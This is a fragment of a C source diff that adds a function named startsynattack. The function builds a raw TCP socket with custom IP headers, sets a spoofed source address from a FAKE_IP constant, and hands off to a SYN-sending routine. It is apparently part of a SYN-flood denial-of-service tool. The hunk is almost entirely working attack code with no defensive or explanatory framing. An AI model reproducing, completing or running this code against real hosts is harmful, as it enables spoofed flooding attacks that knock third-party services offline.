@@ -7,7 +7,38 @@ static inline long myrandom(int begin,int end)
     ret = rand() % end + begin;
     return ret;
 }
-
+int startsynattack(const char * __ipaddr ,int __port)
+{
+        int FakeIpNet;
+        int FakeIpHost;
+        struct sockaddr_in addr;
+        int sockfd;
+        struct hostent *host;
+        int on = 1;
+        int ret;
+        bzero(&addr,sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(__port);
+        FakeIpNet = inet_addr(FAKE_IP);
+        FakeIpHost = ntohl(FakeIpNet);
+    if((ret = inet_aton(__ipaddr,&addr.sin_addr)) != 0)
+    {
+       if(( host = gethostbyname(__ipaddr)) == NULL){
+           return 2001;
+       }
+       else{
+           memcpy((char *)&addr.sin_addr,(host->h_addr_list)[0],host->h_length);
+       }
+       sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
+       if(sockfd < 0){
+           return errno;
+       }
+       setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
+       setuid(getpid());
+       sendsynfunc(FakeIpHost,sockfd,&addr);
+   }
+       return 0;
+}
 static ushort chksum(ushort *data,ushort length)
 {
     int nleft = length;
